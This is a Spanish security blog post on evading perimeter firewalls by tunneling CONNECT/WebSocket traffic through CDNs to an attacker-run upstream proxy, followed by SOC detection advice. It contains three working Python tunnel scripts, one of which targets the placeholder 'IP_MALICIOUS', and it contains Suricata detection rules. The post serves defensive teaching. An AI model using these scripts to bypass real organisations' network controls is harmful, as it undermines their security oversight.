---
title: "Evasión de controles perimetrales mediante túneles sobre CDN (y cómo detectarlo en un SOC)"
description: "Aprende cómo evadir controles perimetrales y filtros SNI usando túneles sobre CDN legítimas (TLS 1.3), y cómo detectarlo en tu SOC con Suricata y Zeek."
pubDate: "2026-03-24"
author: "EVLBYTE"
tags: ["Blue Team", "CDN Tunneling", "Detección de Amenazas", "Evasión de Firewalls", "JA3 Fingerprint", "NDR", "Red Team", "Suricata", "TLS 1.3"]
category: "Ciberseguridad"
heroImage: "/images/2026_03_image.png"
draft: false
---

## 1. ¿Qué es una CDN y por qué es relevante en técnicas de evasión?

Un Content Delivery Network (CDN) es una red distribuida de servidores geográficamente dispersos diseñada fundamentalmente para tres objetivos:

- Reducir la latencia: Acercando el contenido estático y dinámico al usuario final mediante Puntos de Presencia (PoP).
- Mitigar la congestión: Evitando que un único servidor central colapse ante millones de peticiones simultáneas.
- Garantizar la alta disponibilidad: Distribuyendo la carga de forma resiliente si un nodo cae.

Antes de las CDN, el modelo tradicional era lineal: Usuario → DNS → Servidor Central Único. Con una CDN, el flujo se transforma:

Usuario → Nodo CDN cercano (PoP) → (si es necesario) → Servidor Origen

![Fuente: https://www.ssl.com/es/art%C3%ADculo/que-es-un-cdn/](/images/2026_03_image.png)

Fuente de referencia arquitectónica: ssl.com

Gracias a esta proximidad, el tráfico viaja hacia direcciones IP locales y confiables. Y aquí radica el punto crítico para la evasión:

- La CDN termina y gestiona la conexión TLS con certificados válidos y dominios de reputación intachable.
- Acepta y transporta eficientemente tráfico HTTPS estándar (puerto 443).
- En configuraciones por defecto, la CDN actúa como proxy inverso y no siempre realiza inspección profunda de la semántica del payload que reenvía hacia el origen.

## 2. ⚠️ Descargo de Responsabilidad (Disclaimer)

Las técnicas, scripts y pruebas de concepto presentadas en este artículo tienen un propósito estrictamente educativo, académico y de investigación en ciberseguridad defensiva. Su objetivo es ayudar a profesionales de seguridad y equipos Blue Team a identificar, detectar y mitigar canales encubiertos en redes corporativas y de telecomunicaciones. El autor no se responsabiliza del uso indebido o no autorizado de esta información.

## 3. Anatomía de la Evasión: Del Tráfico Legítimo al Canal Encubierto

![Imagen técnica](/images/2026_03_image-2.png)

La técnica no busca vulnerar la criptografía de TLS, sino explotar el modelo de confianza perimetral en tres fases sucesivas:

### Fase 1: Handshake TLS 1.3 legítimo hacia dominio permitido

El cliente malicioso inicia una conexión aparentemente inofensiva hacia una infraestructura servida por un CDN (por ejemplo, dominios como Google, Akamai, Cloudflare, etc.). Características de esta fase:

- Puerto 443 TCP estándar.
- Handshake TLS 1.3 completamente válido con certificado oficial.
- SNI (Server Name Indication) visible y autorizado por las políticas del firewall perimetral (ej: googletagmanager.com o similar).

En este instante, el Firewall de Próxima Generación (NGFW) no detecta ninguna anomalía: observa una sesión segura hacia un destino catalogado como confiable.

### Fase 2: Transición a un canal persistente (HTTP CONNECT / WebSocket)

Una vez que la sesión TLS se establece entre el cliente y el nodo CDN, el firewall pierde visibilidad del contenido si no cuenta con inspección profunda TLS/SSL. Es en este momento donde el cliente reutiliza la conexión para solicitar una actualización de protocolo o un túnel TCP:

- Petición CONNECT para reenviar tráfico crudo.
- Handshake de WebSocket para comunicación full-duplex continua.

Conceptualmente se transita de un flujo web convencional (petición/respuesta de corta duración) a un canal bidireccional continuo. No se trata de un downgrade visible de TLS, sino de una encapsulación a nivel lógico dentro del túnel ya aprobado.

### Fase 3: Doble cifrado hacia el servidor malicioso (C2 / Upstream)

La CDN redirige la conexión hacia el servidor upstream controlado por el atacante. Para asegurar que ni siquiera la CDN pueda inspeccionar los comandos reales o la navegación resultante, el atacante puede emplear una capa de cifrado adicional (por ejemplo, tráfico VPN tipo OpenConnect o SSH encapsulado):

![Imagen técnica](/images/2026_03_image-3.png)

Existe así un doble cifrado: la capa externa protegida por el certificado de la CDN frente al firewall corporativo, y la capa interna descifrada exclusivamente por el servidor final del atacante. El usuario malicioso obtiene así una pasarela completa para navegar hacia cualquier destino sin restricciones perimetrales.

## 4. Prueba de Concepto (Laboratorio con Scripts Python)

Para simular y validar esta dinámica en laboratorio, desarrollamos tres scripts complementarios:

### Script 1: cdn_node_sim.py (Simulador de reenvío en nodo CDN)

Este script emula el comportamiento de un intermediario capaz de aceptar peticiones CONNECT y conmutar a un reenvío bidireccional de sockets en hilos independientes:

```python
import socket
import threading

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 8080

def handle_client(client_socket):
    request = client_socket.recv(4096).decode()
    print("\n[CDN] ===== NUEVA CONEXION =====")
    print(request)

    if request.startswith("CONNECT"):
        try:
            # Parsear destino
            first_line = request.split("\n")[0]
            target = first_line.split(" ")[1]
            host, port = target.split(":")
            port = int(port)

            print(f"[CDN] Túnel solicitado hacia {host}:{port}")

            # Conectar al servidor destino (malicioso)
            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.connect((host, port))

            # Responder OK al cliente
            client_socket.send(b"HTTP/1.1 200 Connection Established\r\n\r\n")

            # Iniciar túnel bidireccional
            threading.Thread(target=forward, args=(client_socket, remote)).start()
            threading.Thread(target=forward, args=(remote, client_socket)).start()

        except Exception as e:
            print(f"[CDN] Error: {e}")
            client_socket.close()
    else:
        print("[CDN] Metodo no soportado")
        client_socket.close()

def forward(source, destination):
    try:
        while True:
            data = source.recv(4096)
            if not data:
                break

            print(f"[CDN] Forwarding {len(data)} bytes")
            destination.send(data)
    except:
        pass
    finally:
        source.close()
        destination.close()

def start():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((LISTEN_IP, LISTEN_PORT))
    server.listen(5)

    print(f"[CDN] Escuchando en {LISTEN_PORT} (modo túnel)...")

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket,)).start()

start()
```

### Script 2: c2_proxy_server.py (Servidor Upstream / Proxy de Destino)

Representa el servidor bajo control del atacante que recibe el tráfico proveniente de la CDN, realiza la petición real hacia el recurso solicitado y devuelve el payload cifrado:

```python
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import requests

class ProxyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        print("\n[MALICIOUS] ===== NUEVA REQUEST =====")
        print(f"Cliente: {self.client_address}")
        print(f"Path: {self.path}")

        print("\n[MALICIOUS] Headers:")
        for key, value in self.headers.items():
            print(f"{key}: {value}")

        # Determinar destino real
        target_url = None

        # Caso 1: viene URL completa
        if self.path.startswith("http://") or self.path.startswith("https://"):
            target_url = self.path
        else:
            host = self.headers.get("Host")
            if host:
                target_url = f"http://{host}{self.path}"

        print(f"\n[MALICIOUS] Redirigiendo a: {target_url}")

        try:
            # Hacer request real (simula wget)
            response = requests.get(target_url, timeout=5)

            print(f"[MALICIOUS] Respuesta {response.status_code}")

            # Responder al cliente
            self.send_response(response.status_code)

            # Copiar headers básicos
            self.send_header("Content-Type", response.headers.get("Content-Type", "text/plain"))
            self.send_header("Connection", "keep-alive")
            self.end_headers()

            # Enviar contenido (limitado para evitar overflow en consola)
            content = response.content[:4096]

            print("\n[MALICIOUS] Payload recibido (truncado):")
            print(content.decode(errors="ignore"))

            self.wfile.write(content)

        except Exception as e:
            print(f"[MALICIOUS] Error: {e}")

            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

def run():
    server = ThreadingHTTPServer(('0.0.0.0', 9000), ProxyHandler)
    print("[MALICIOUS] Proxy malicioso escuchando en 9000...")
    server.serve_forever()

if __name__ == "__main__":
    run()
```

### Script 3: tunnel_client.py (Cliente Local que Establece el Túnel)

Simula la máquina origen interna que genera la petición CONNECT hacia la CDN y mantiene el canal abierto para despachar peticiones arbitrarias:

```python
import socket
import threading

CDN_IP = "IP_CDN"
CDN_PORT = 8080
TARGET = "IP_MALICIOUS:9000"

def receive_data(sock):
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            print("\n[CLIENT] <<< RESPUESTA <<<")
            print(data.decode(errors="ignore"))
    except:
        pass

def send_requests(sock):
    try:
        while True:
            print("\n[CLIENT] Escribe una ruta a solicitar (ej: / , /test , /file):")
            path = input("> ")

            if path.lower() == "exit":
                break

            request = f"GET {path} HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n"
            print(f"\n[CLIENT] >>> Enviando request a {path} dentro del túnel...")
            sock.send(request.encode())

    except:
        pass

def main():
    print("[CLIENT] Conectando al CDN...")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((CDN_IP, CDN_PORT))

    connect_request = f"CONNECT {TARGET} HTTP/1.1\r\nHost: cdn.permitido.com\r\n\r\n"
    print("[CLIENT] Enviando CONNECT...")
    client.send(connect_request.encode())
    response = client.recv(4096)
    print("[CLIENT] Respuesta del CDN:")
    print(response.decode())

    if b"200" not in response:
        print("[CLIENT] Error estableciendo túnel")
        client.close()
        return

    print("\n[CLIENT] Túnel establecido. Puedes enviar múltiples requests.\n")

    # 2. Hilo para recibir datos
    recv_thread = threading.Thread(target=receive_data, args=(client,))
    recv_thread.daemon = True
    recv_thread.start()

    # 3. Enviar múltiples requests
    send_requests(client)
    print("[CLIENT] Cerrando conexión...")
    client.close()

if __name__ == "__main__":
    main()
```

### Validación y Evidencia en Tráfico de Red

Al capturar el tráfico con Wireshark en el host de origen, se evidencia que todos los paquetes salientes tienen como único destino la dirección IP y puerto del CDN (8080 en el laboratorio, 443 en producción), incluso cuando el usuario está navegando hacia destinos restringidos como Facebook:

![Imagen técnica](/images/2026_03_image-4.png)

El log del simulador CDN confirma la recepción del túnel y la transferencia de bytes hacia el servidor malicioso:

![Imagen técnica](/images/2026_03_image-5.png)

El servidor malicioso recibe la solicitud encapsulada, resuelve el destino y devuelve la respuesta al canal:

![Imagen técnica](/images/2026_03_image-6.png)

Finalmente, desde la consola del cliente observamos cómo se recibe el contenido de la página solicitada a través del túnel encubierto:

![Imagen técnica](/images/2026_03_image-7.png)

“La evasión no ocurre rompiendo la criptografía de TLS, sino utilizándolo como un canal de transporte de alta confianza para ocultar completamente la verdadera intención del tráfico.”

## 5. ¿Cómo detectarlo y responder desde un SOC?

Para mitigar eficazmente este vector, los equipos de Blue Team y analistas de SOC no pueden confiar ciegamente en la reputación de la IP o del dominio. Es indispensable implementar una estrategia centrada en visibilidad profunda y análisis conductual:

1. Inspección TLS / Descifrado SSL: En los segmentos corporativos donde sea factible técnica y normativamente, el descifrado perimetral permite visibilizar el método CONNECT y los handshakes de WebSockets anómalos.
2. Huellas de Cifrado (JA3 / JA4): Los binarios y scripts de túneles raramente usan la misma combinación de cifrados que navegadores como Chrome o Firefox. Un análisis de JA3/JA4 en el handshake alertará de clientes no autorizados.
3. Análisis de Comportamiento de Flujo (NDR / Zeek): Sesiones TCP/HTTPS con tiempos de conexión anormalmente altos (horas continuas) y flujo simétrico de subida y bajada discrepan radicalmente de la navegación web común.
4. Controles en el Endpoint (EDR/XDR): Monitorización de procesos no autorizados levantando sockets locales o redirigiendo el tráfico del sistema hacia puertos locales.

### Reglas de Detección para Suricata

Regla 1: Alerta ante cabeceras HTTP personalizadas sospechosas (inyección de comandos en cabeceras tipo X-):

```bash
alert http any any -> any any (
    msg:"POSIBLE TUNEL - Uso sospechoso de dominio CDN";
    flow:established,to_server;
    http.host;
    content:"google";
    nocase;
    http.header;
    content:"X-";
    nocase;
    classtype:policy-violation;
    sid:1000002;
    rev:1;
)
```

Regla 2: Detección del método CONNECT anómalo hacia infraestructuras web estándar:

```bash
alert http any any -> any any (
    msg:"TUNEL HTTP DETECTADO - Metodo CONNECT";
    flow:established,to_server;
    http.method;
    content:"CONNECT";
    classtype:policy-violation;
    sid:1000003;
    rev:1;
)
```

Regla 3: Detección de conexiones persistentes de larga duración hacia puertos 443:

```text
alert tcp any any -> any 443 (
    msg:"POSIBLE TUNEL - Conexion persistente a 443";
    flow:established;
    threshold:type both, track by_src, count 50, seconds 60;
    classtype:policy-violation;
    sid:1000007;
    rev:1;
)
```

Regla 4: Identificación de huella JA3 sospechosa correspondiente a herramientas de túnel:

```bash
alert tls any any -> any any (
    msg:"JA3 sospechoso - posible herramienta de tunel";
    ja3.hash;
    content:"d4e5f6g7h8i9j0";  # reemplazar con hash real detectado
    classtype:bad-unknown;
    sid:1000006;
    rev:1;
)
```

## 6. Conclusión

En un entorno donde las amenazas evolucionan constantemente, las técnicas de los adversarios buscan activamente convertir las fortalezas de la arquitectura de Internet (como las CDNs) en sus mayores aliados para la evasión. Los mecanismos básicos de un firewall basados exclusivamente en listas de reputación o categorías de dominio ya no son una garantía de seguridad.

La defensa debe transitar hacia un modelo Zero Trust y análisis de anomalías de comportamiento, entendiendo que el indicador de compromiso muchas veces no está en a dónde se conecta el usuario, sino en cómo se comporta ese flujo en el tiempo.

Hack the Byte: Descifrando la seguridad, byte a byte.
